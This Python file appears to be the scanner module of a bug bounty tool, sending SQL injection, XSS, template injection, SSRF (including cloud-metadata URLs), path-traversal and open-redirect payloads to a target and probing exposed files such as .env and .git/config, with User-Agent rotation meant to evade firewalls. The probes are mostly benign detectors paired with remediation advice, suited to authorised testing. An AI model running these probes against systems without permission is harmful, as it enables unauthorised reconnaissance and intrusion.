"""
EthioVuln — Advanced Bug Bounty Fuzzer
Covers: SQLi, XSS, SSTI, SSRF, CORS, Headers, LFI, Open Redirect, Clickjacking
"""

import logging
import random
import time
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlencode, urlunparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from app.config import get_settings
from app.utils.cwe_mapping import get_cwe_info

settings = get_settings()
logger = logging.getLogger(__name__)

# ─── WAF Evasion: Rotate User-Agents ─────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# ─── Payloads ────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "admin'--",
    "' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
]

SQLI_ERRORS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array",
    "mysql_fetch_assoc",
    "mysql_num_rows",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    # Generic SQL
    "sql syntax",
    "syntax error",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "invalid query",
    "division by zero",
    # Oracle
    "ora-",
    "oracle error",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql",
    # MSSQL
    "mssql_",
    "microsoft sql",
    "odbc sql server",
    "odbc_",
    # SQLite
    "sqlite_",
    "sqlite error",
    # General
    "supplied argument is not",
    "db2 sql error",
    "jdbc",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<body onload=alert(1)>",
]

SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]

SSRF_PAYLOADS = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254",
                 "http://169.254.169.254/latest/meta-data/",
                 "http://[::1]", "http://0.0.0.0"]

LFI_PAYLOADS = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
                "C:\\Windows\\win.ini"]

OPEN_REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com", "/\\evil.com",
                           "https://evil.com%2F", "@evil.com", "evil.com"]

SSTI_DETECT = ["49", "{{", "error", "jinja", "twig", "freemarker"]

COMMON_PARAMS = ["id", "user", "page", "q", "search", "url", "redirect",
                 "name", "input", "file", "lang", "view", "action"]

SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.yml", "/config.json", "/config.php", "/settings.py",
    "/wp-config.php", "/web.config", "/appsettings.json",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/admin", "/admin/", "/administrator", "/admin/login",
    "/wp-admin", "/wp-login.php", "/phpmyadmin",
    "/swagger.json", "/swagger-ui.html", "/api-docs", "/openapi.json", "/graphql",
    "/backup.zip", "/backup.sql", "/db.sql", "/database.sql",
    "/robots.txt", "/sitemap.xml",
    "/phpinfo.php", "/info.php", "/.htaccess",
    "/actuator/env", "/actuator/health",
    "/server-status", "/server-info",
    "/api/v1/users", "/api/v1/admin", "/api/users", "/api/admin",
    "/metrics", "/health", "/healthcheck",
    "/.dockerenv", "/Dockerfile",
]

INTERESTING_STATUS_CODES = {200, 201, 301, 302, 307, 308, 401, 403}
SENSITIVE_STATUS_CODES = {200, 201}


class _FormParser(HTMLParser):
    """Extract HTML forms and their controls for lightweight CSRF checks."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        attributes = dict(attrs)
        if tag.lower() == "form":
            self._current = {
                "action": attributes.get("action", ""),
                "method": attributes.get("method", "get").lower(),
                "controls": [],
            }
        elif self._current is not None and tag.lower() in {"input", "button", "textarea", "select"}:
            self._current["controls"].append(attributes)

    def handle_endtag(self, tag):
        if tag.lower() == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


def make_finding(title, desc, severity, cvss, cwe_id, url, evidence,
                 req="", resp="", remediation="", template_id="fuzzer"):
    cwe_info = get_cwe_info(cwe_id)
    return {
        "title": title, "description": desc, "severity": severity,
        "cvss_score": cvss, "cvss_vector": "",
        "cwe_id": cwe_id, "cwe_name": cwe_info.get("name", ""),
        "url": url, "evidence": evidence,
        "request_data": req, "response_data": resp[:300] if resp else "",
        "remediation": remediation, "reference_urls": "",
        "source": "fuzzer", "template_id": template_id,
    }


class DirectoryFuzzer:
    def __init__(self, threads=None, timeout=None, rate_limit=None):
        self.threads = threads or settings.FUZZER_THREADS
        self.timeout = timeout or settings.FUZZER_TIMEOUT
        self.rate_limit = rate_limit or settings.FUZZER_RATE_LIMIT
        self._stop_flag = False

    def _make_session(self):
        """Create a fresh session with a random User-Agent for WAF evasion."""
        session = requests.Session()
        # No retries — strict timeout, fail fast
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=20, pool_maxsize=20, max_retries=0
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
        })
        session.verify = False
        return session

    @property
    def session(self):
        """Return a session with rotated User-Agent each time."""
        return self._make_session()

    def stop(self):
        self._stop_flag = True

    # ── Security Headers ──────────────────────────────────────────────────────
    def _check_security_headers(self, base_url):
        findings = []
        try:
            sess = self.session
            resp = sess.get(base_url, timeout=self.timeout, allow_redirects=True)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            checks = [
                ("x-frame-options", "Missing X-Frame-Options Header",
                 "Clickjacking protection missing. Attacker can embed site in iframe.",
                 "medium", 4.3, "CWE-1021",
                 "Add: X-Frame-Options: DENY or SAMEORIGIN"),
                ("x-content-type-options", "Missing X-Content-Type-Options",
                 "MIME sniffing attack possible.", "low", 3.1, "CWE-693",
                 "Add: X-Content-Type-Options: nosniff"),
                ("strict-transport-security", "Missing HSTS Header",
                 "HTTP Strict Transport Security not enforced.", "medium", 4.3, "CWE-319",
                 "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
                ("content-security-policy", "Missing Content-Security-Policy",
                 "No CSP header — XSS attacks more likely to succeed.", "medium", 5.4, "CWE-693",
                 "Implement a strict Content-Security-Policy header."),
                ("x-xss-protection", "Missing X-XSS-Protection",
                 "Browser XSS filter not enabled.", "low", 3.1, "CWE-693",
                 "Add: X-XSS-Protection: 1; mode=block"),
                ("referrer-policy", "Missing Referrer-Policy",
                 "Referrer info may leak to third parties.", "low", 2.0, "CWE-200",
                 "Add: Referrer-Policy: strict-origin-when-cross-origin"),
                ("permissions-policy", "Missing Permissions-Policy",
                 "Browser features not restricted.", "low", 2.0, "CWE-693",
                 "Add Permissions-Policy to restrict camera, microphone, geolocation."),
            ]
            for header, title, desc, sev, cvss, cwe, rem in checks:
                if header not in headers:
                    findings.append(make_finding(
                        title, desc, sev, cvss, cwe, base_url,
                        f"Header '{header}' not present in response",
                        f"GET {base_url}", str(dict(resp.headers))[:300], rem,
                        f"header-{header}",
                    ))
        except Exception as e:
            logger.debug(f"Header check error: {e}")
        return findings

    # ── CORS ──────────────────────────────────────────────────────────────────
    def _check_cors(self, base_url):
        findings = []
        try:
            sess = self.session
            resp = sess.get(base_url, timeout=self.timeout,
                            headers={"Origin": "https://evil.com"})
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if "evil.com" in acao or acao == "*":
                sev = "high" if acac.lower() == "true" else "medium"
                findings.append(make_finding(
                    "CORS Misconfiguration",
                    "Server reflects arbitrary Origin or uses wildcard with credentials.",
                    sev, 7.5 if sev == "high" else 5.3, "CWE-942", base_url,
                    f"ACAO: {acao}\nACAC: {acac}",
                    f"GET {base_url}\nOrigin: https://evil.com",
                    f"ACAO: {acao}",
                    "Whitelist specific trusted origins. Never use * with credentials.",
                    "cors-misconfiguration",
                ))
        except Exception as e:
            logger.debug(f"CORS check error: {e}")
        return findings

    # ── CSRF ──────────────────────────────────────────────────────────────────
    def _check_csrf(self, base_url):
        findings = []
        state_changing_methods = {"post", "put", "patch", "delete"}
        token_names = ("csrf", "xsrf", "authenticity", "nonce", "token")
        try:
            resp = self.session.get(base_url, timeout=self.timeout)
            parser = _FormParser()
            parser.feed(resp.text)
            base = urlparse(base_url)
            vulnerable_forms = []

            for form in parser.forms:
                if form["method"] not in state_changing_methods:
                    continue
                action = urljoin(base_url, form["action"] or base_url)
                action_url = urlparse(action)
                if action_url.netloc and action_url.netloc != base.netloc:
                    continue
                has_token = any(
                    any(marker in (control.get("name", "") or "").lower() for marker in token_names)
                    for control in form["controls"]
                )
                if not has_token:
                    vulnerable_forms.append(action)

            if vulnerable_forms:
                evidence = "\n".join(
                    f"{method.upper()} {action} has no CSRF token field"
                    for method, action in [("post", action) for action in vulnerable_forms]
                )
                findings.append(make_finding(
                    "Potential Cross-Site Request Forgery (CSRF)",
                    f"Found {len(vulnerable_forms)} same-origin state-changing form(s) without an apparent CSRF token.",
                    "medium", 6.5, "CWE-352", base_url, evidence,
                    f"GET {base_url}", resp.text[:500],
                    "Add an unpredictable per-session CSRF token to every state-changing form and validate it server-side. Also use SameSite cookies and verify the Origin header.",
                    "csrf-form-token",
                ))
        except Exception as e:
            logger.debug(f"CSRF check error: {e}")
        return findings

    # ── XSS ───────────────────────────────────────────────────────────────────
    def _check_xss(self, base_url):
        findings = []
        found_params = set()
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)
        all_params = list(existing_params.keys()) + [p for p in COMMON_PARAMS if p not in existing_params]
        try:
            for param in all_params[:10]:
                if param in found_params:
                    continue
                for payload in XSS_PAYLOADS:
                    test_params = dict(existing_params)
                    test_params[param] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    if existing_params:
                        new_query = urlencode(flat_params)
                        test_url = urlunparse(parsed._replace(query=new_query))
                    else:
                        test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=self.timeout)
                        # Check for UNENCODED reflection — key XSS indicator
                        # Must appear as-is, not HTML-encoded (&lt;script&gt;)
                        reflected = (
                            payload in resp.text and
                            "&lt;" not in resp.text.split(payload)[0][-10:] if payload in resp.text else False
                        )
                        if reflected:
                            found_params.add(param)
                            findings.append(make_finding(
                                f"Reflected XSS in '{param}'",
                                f"Payload reflected unencoded in response for parameter '{param}'. "
                                f"Attacker can execute arbitrary JavaScript in victim's browser.",
                                "high", 7.2, "CWE-79", test_url,
                                f"Payload: {payload}\nReflected unencoded in response body",
                                f"GET {test_url}", resp.text[:300],
                                "HTML-encode all user output. Implement strict CSP. Use framework auto-escaping.",
                                "xss-reflected",
                            ))
                            break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"XSS check error: {e}")
        return findings

    # ── SQL Injection ─────────────────────────────────────────────────────────
    def _check_sqli(self, base_url):
        findings = []
        found_params = set()
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)
        all_params = list(existing_params.keys()) + [p for p in COMMON_PARAMS if p not in existing_params]

        try:
            for param in all_params[:10]:
                if param in found_params:
                    continue
                for payload in SQLI_PAYLOADS:
                    test_params = dict(existing_params)
                    test_params[param] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    if existing_params:
                        new_query = urlencode(flat_params)
                        test_url = urlunparse(parsed._replace(query=new_query))
                    else:
                        test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=self.timeout)
                        body_lower = resp.text.lower()
                        matched_error = next(
                            (e for e in SQLI_ERRORS if e in body_lower), None
                        )
                        if matched_error:
                            found_params.add(param)
                            findings.append(make_finding(
                                f"SQL Injection in '{param}'",
                                f"SQL error '{matched_error}' detected when injecting into '{param}'. "
                                f"Database may be fully compromised.",
                                "critical", 9.8, "CWE-89", test_url,
                                f"Payload: {payload}\nError keyword: '{matched_error}'\nSnippet: {resp.text[:300]}",
                                f"GET {test_url}",
                                resp.text[:300],
                                "Use parameterized queries. Never concatenate user input into SQL.",
                                "sqli-error-based",
                            ))
                            break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"SQLi check error: {e}")
        return findings

    # ── SSTI ──────────────────────────────────────────────────────────────────
    def _check_ssti(self, base_url):
        findings = []
        try:
            for param in COMMON_PARAMS[:4]:
                for payload in SSTI_PAYLOADS[:3]:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=self.timeout)
                        if "49" in resp.text and "7*7" in payload:
                            findings.append(make_finding(
                                f"Server-Side Template Injection (SSTI) in '{param}'",
                                "Template expression evaluated server-side. Can lead to RCE.",
                                "critical", 9.8, "CWE-94", test_url,
                                f"Payload: {payload} → Response contains '49'",
                                f"GET {test_url}", resp.text[:300],
                                "Never pass user input to template engines. Use sandboxed rendering.",
                                "ssti-detection",
                            ))
                            break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"SSTI check error: {e}")
        return findings

    # ── Open Redirect ─────────────────────────────────────────────────────────
    def _check_open_redirect(self, base_url):
        findings = []
        redirect_params = ["redirect", "url", "next", "return", "goto",
                           "returnUrl", "redirectTo", "continue", "dest"]
        try:
            for param in redirect_params:
                for payload in OPEN_REDIRECT_PAYLOADS[:3]:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=self.timeout,
                                        allow_redirects=False)
                        location = resp.headers.get("Location", "")
                        if "evil.com" in location or resp.status_code in (301, 302, 307):
                            if "evil.com" in location:
                                findings.append(make_finding(
                                    f"Open Redirect in '{param}'",
                                    "Attacker can redirect users to malicious sites for phishing.",
                                    "medium", 6.1, "CWE-601", test_url,
                                    f"Redirects to: {location}",
                                    f"GET {test_url}",
                                    f"Location: {location}",
                                    "Validate redirect URLs against a whitelist of allowed domains.",
                                    "open-redirect",
                                ))
                                break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"Open redirect check error: {e}")
        return findings

    # ── LFI ───────────────────────────────────────────────────────────────────
    def _check_lfi(self, base_url):
        findings = []
        file_params = ["file", "path", "page", "include", "template",
                       "view", "load", "read", "doc", "document"]
        lfi_indicators = ["root:x:", "[boot loader]", "for 16-bit app support",
                          "daemon:x:", "bin:x:"]
        try:
            for param in file_params[:4]:
                for payload in LFI_PAYLOADS[:5]:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=self.timeout)
                        for indicator in lfi_indicators:
                            if indicator in resp.text:
                                findings.append(make_finding(
                                    f"Local File Inclusion (LFI) in '{param}'",
                                    "Attacker can read arbitrary files from the server including /etc/passwd.",
                                    "critical", 9.1, "CWE-22", test_url,
                                    f"Payload: {payload}\nIndicator found: {indicator}",
                                    f"GET {test_url}", resp.text[:300],
                                    "Validate file paths. Use allowlists. Never pass user input to file functions.",
                                    "lfi-detection",
                                ))
                                break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"LFI check error: {e}")
        return findings

    # ── SSRF ──────────────────────────────────────────────────────────────────
    def _check_ssrf(self, base_url):
        findings = []
        ssrf_params = ["url", "src", "href", "path", "dest", "redirect",
                       "uri", "link", "fetch", "load", "proxy"]
        try:
            for param in ssrf_params[:4]:
                for payload in SSRF_PAYLOADS[:3]:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        sess = self.session
                        resp = sess.get(test_url, timeout=5)
                        if resp.status_code == 200 and len(resp.text) > 100:
                            if any(x in resp.text.lower() for x in
                                   ["ami-id", "instance-id", "local", "127", "metadata"]):
                                findings.append(make_finding(
                                    f"Server-Side Request Forgery (SSRF) in '{param}'",
                                    "Server fetches internal URLs. Can expose cloud metadata, internal services.",
                                    "critical", 9.1, "CWE-918", test_url,
                                    f"Payload: {payload} returned internal data",
                                    f"GET {test_url}", resp.text[:300],
                                    "Validate and whitelist allowed URLs. Block internal IP ranges.",
                                    "ssrf-detection",
                                ))
                                break
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"SSRF check error: {e}")
        return findings

    # ── Clickjacking ──────────────────────────────────────────────────────────
    def _check_clickjacking(self, base_url):
        findings = []
        try:
            sess = self.session
            resp = sess.get(base_url, timeout=self.timeout)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            xfo = headers.get("x-frame-options", "")
            csp = headers.get("content-security-policy", "")
            if not xfo and "frame-ancestors" not in csp:
                findings.append(make_finding(
                    "Clickjacking Vulnerability",
                    "Page can be embedded in an iframe. Attacker can trick users into clicking hidden elements.",
                    "medium", 4.3, "CWE-1021", base_url,
                    "No X-Frame-Options or CSP frame-ancestors directive found",
                    f"GET {base_url}", "",
                    "Add X-Frame-Options: DENY or CSP: frame-ancestors 'none'",
                    "clickjacking",
                ))
        except Exception as e:
            logger.debug(f"Clickjacking check error: {e}")
        return findings

    # ── Information Disclosure ────────────────────────────────────────────────
    def _check_info_disclosure(self, base_url):
        findings = []
        try:
            sess = self.session
            resp = sess.get(base_url, timeout=self.timeout)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            server = headers.get("server", "")
            powered = headers.get("x-powered-by", "")
            if server:
                findings.append(make_finding(
                    "Server Version Disclosure",
                    f"Server header reveals technology: {server}",
                    "low", 2.0, "CWE-200", base_url,
                    f"Server: {server}",
                    f"GET {base_url}", "",
                    "Remove or obscure the Server header in web server config.",
                    "info-server-header",
                ))
            if powered:
                findings.append(make_finding(
                    "Technology Disclosure via X-Powered-By",
                    f"X-Powered-By reveals backend technology: {powered}",
                    "low", 2.0, "CWE-200", base_url,
                    f"X-Powered-By: {powered}",
                    f"GET {base_url}", "",
                    "Remove X-Powered-By header.",
                    "info-powered-by",
                ))
        except Exception as e:
            logger.debug(f"Info disclosure check error: {e}")
        return findings

    # ── Directory Fuzzing ─────────────────────────────────────────────────────
    def _check_path(self, base_url, path):
        if self._stop_flag:
            return None
        url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
        try:
            sess = self.session
            resp = sess.get(url, timeout=self.timeout, allow_redirects=False)
            status_code = resp.status_code
            content_length = len(resp.content)

            # Report 401/403 — resource exists but protected
            if status_code in (401, 403):
                severity, cvss_score, cwe_id = self._classify_path(path, status_code)
                cwe_info = get_cwe_info(cwe_id)
                return {
                    "title": f"Protected Resource: {path}",
                    "description": f"Resource '{path}' exists but requires authentication (HTTP {status_code}).",
                    "severity": severity, "cvss_score": cvss_score, "cvss_vector": "",
                    "cwe_id": cwe_id, "cwe_name": cwe_info.get("name", ""),
                    "url": url, "evidence": f"HTTP {status_code} — Resource exists",
                    "request_data": f"GET {url}", "response_data": f"HTTP/{status_code}",
                    "remediation": self._get_remediation(path),
                    "reference_urls": "", "source": "fuzzer", "template_id": "fuzz-protected",
                }

            # Report 200/201 for any sensitive path
            if status_code in (200, 201) and content_length > 0:
                severity, cvss_score, cwe_id = self._classify_path(path, status_code)
                cwe_info = get_cwe_info(cwe_id)
                evidence = f"HTTP {status_code} | Content-Length: {content_length}\n\nResponse Preview:\n{resp.text[:300]}"
                return {
                    "title": f"Exposed: {path}",
                    "description": self._get_description(path, status_code),
                    "severity": severity, "cvss_score": cvss_score, "cvss_vector": "",
                    "cwe_id": cwe_id, "cwe_name": cwe_info.get("name", ""),
                    "url": url, "evidence": evidence,
                    "request_data": f"GET {url}",
                    "response_data": f"HTTP/{status_code} Content-Length: {content_length}",
                    "remediation": self._get_remediation(path),
                    "reference_urls": "", "source": "fuzzer", "template_id": "fuzz-dir",
                }

            # Report redirects for sensitive paths
            if status_code in (301, 302, 307, 308):
                location = resp.headers.get("Location", "")
                severity, cvss_score, cwe_id = self._classify_path(path, status_code)
                cwe_info = get_cwe_info(cwe_id)
                return {
                    "title": f"Redirect: {path}",
                    "description": f"Resource '{path}' redirects to {location}",
                    "severity": "info", "cvss_score": 0.0, "cvss_vector": "",
                    "cwe_id": "CWE-200", "cwe_name": "Information Exposure",
                    "url": url, "evidence": f"HTTP {status_code} → {location}",
                    "request_data": f"GET {url}", "response_data": f"Location: {location}",
                    "remediation": "Review redirect configuration.",
                    "reference_urls": "", "source": "fuzzer", "template_id": "fuzz-redirect",
                }

            return None
        except Exception:
            return None

    def _classify_path(self, path, status_code):
        p = path.lower()
        if ".env" in p or "credentials" in p:
            return ("high", 7.5, "CWE-200") if status_code in SENSITIVE_STATUS_CODES else ("medium", 5.3, "CWE-200")
        if any(x in p for x in [".git/", ".svn/", ".sql", "dump", "backup"]):
            return ("high", 7.5, "CWE-538") if status_code in SENSITIVE_STATUS_CODES else ("medium", 5.3, "CWE-538")
        if any(x in p for x in ["admin", "phpmyadmin", "manager", "console"]):
            return ("medium", 5.3, "CWE-425") if status_code in SENSITIVE_STATUS_CODES else ("low", 3.7, "CWE-425")
        if any(x in p for x in ["phpinfo", "debug", "actuator", "server-status"]):
            return ("medium", 5.3, "CWE-200") if status_code in SENSITIVE_STATUS_CODES else ("low", 3.7, "CWE-200")
        if status_code == 403:
            return "info", 0.0, "CWE-200"
        return "low", 2.0, "CWE-200"

    def _get_description(self, path, status_code):
        p = path.lower()
        s = "accessible" if status_code in SENSITIVE_STATUS_CODES else "detected"
        if ".env" in p:
            return f"Environment file '{path}' is {s} (HTTP {status_code}). May contain credentials and API keys."
        if ".git" in p:
            return f"Git repository data '{path}' is {s} (HTTP {status_code}). Source code may be downloadable."
        if "admin" in p:
            return f"Admin interface '{path}' is {s} (HTTP {status_code}). Should not be publicly accessible."
        if "backup" in p or ".sql" in p:
            return f"Backup/database file '{path}' is {s} (HTTP {status_code}). May expose sensitive data."
        return f"Sensitive path '{path}' returned HTTP {status_code}."

    def _get_remediation(self, path):
        p = path.lower()
        if ".env" in p:
            return "Remove .env from web root. Block dotfiles in web server. Rotate exposed credentials."
        if ".git" in p:
            return "Remove .git from web root. Block .git access in web server config."
        if "admin" in p:
            return "Restrict admin access by IP. Use MFA. Place behind VPN."
        return "Restrict access to this endpoint. Review web server configuration."

    # ── Main Run ──────────────────────────────────────────────────────────────
    def run_scan(self, target, wordlist=None, progress_callback=None):
        self._stop_flag = False
        paths = wordlist or SENSITIVE_PATHS
        total = len(paths)
        findings = []
        completed = 0

        logger.info(f"Starting fuzzer with {self.threads} threads against {target} ({total} paths)")

        def cb(pct, msg):
            if progress_callback:
                progress_callback(pct, msg)

        cb(2, "Checking security headers...")
        header_findings = self._check_security_headers(target)
        logger.info(f"Security headers check: {len(header_findings)} findings")
        findings.extend(header_findings)

        cb(5, "Checking CORS configuration...")
        cors_findings = self._check_cors(target)
        logger.info(f"CORS check: {len(cors_findings)} findings")
        findings.extend(cors_findings)

        cb(6, "Checking CSRF protections...")
        csrf_findings = self._check_csrf(target)
        logger.info(f"CSRF check: {len(csrf_findings)} findings")
        findings.extend(csrf_findings)

        cb(8, "Checking for Clickjacking...")
        click_findings = self._check_clickjacking(target)
        logger.info(f"Clickjacking check: {len(click_findings)} findings")
        findings.extend(click_findings)

        cb(10, "Checking information disclosure...")
        info_findings = self._check_info_disclosure(target)
        logger.info(f"Info disclosure check: {len(info_findings)} findings")
        findings.extend(info_findings)

        cb(13, "Testing for Reflected XSS...")
        findings.extend(self._check_xss(target))

        cb(19, "Testing for SQL Injection...")
        findings.extend(self._check_sqli(target))

        cb(23, "Testing for SSTI...")
        findings.extend(self._check_ssti(target))

        cb(26, "Testing for Open Redirect...")
        findings.extend(self._check_open_redirect(target))

        cb(29, "Testing for LFI...")
        findings.extend(self._check_lfi(target))

        cb(31, "Testing for SSRF...")
        findings.extend(self._check_ssrf(target))

        cb(34, f"Directory fuzzing ({total} paths)...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_path, target, path): path for path in paths}
            for future in as_completed(futures):
                if self._stop_flag:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                completed += 1
                progress = 34 + int((completed / total) * 66)
                result = future.result()
                if result:
                    findings.append(result)
                    cb(progress, f"Found: {result['title']} ({len(findings)} total)")
                elif completed % 20 == 0:
                    cb(progress, f"Fuzzing: {completed}/{total} paths ({len(findings)} findings)")

        logger.info(f"Fuzzer completed: {len(findings)} findings from {total} paths")
        return findings


directory_fuzzer = DirectoryFuzzer()
